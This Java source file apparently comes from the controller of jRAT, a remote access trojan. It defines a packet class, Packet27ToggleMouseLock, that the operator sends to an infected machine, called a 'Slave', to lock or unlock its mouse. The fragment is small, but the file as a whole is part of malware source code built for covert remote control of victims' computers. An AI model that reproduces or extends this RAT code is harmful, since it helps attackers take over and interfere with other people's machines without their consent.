package io.jrat.controller.packets.outgoing;

import io.jrat.controller.Slave;
import java.io.DataOutputStream;


public class Packet27ToggleMouseLock extends AbstractOutgoingPacket {

	private boolean enabled;

	public Packet27ToggleMouseLock(boolean enabled) {
		this.enabled = enabled;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeBoolean(this.enabled);
	}

	@Override
	public short getPacketId() {
		return 27;
	}

}
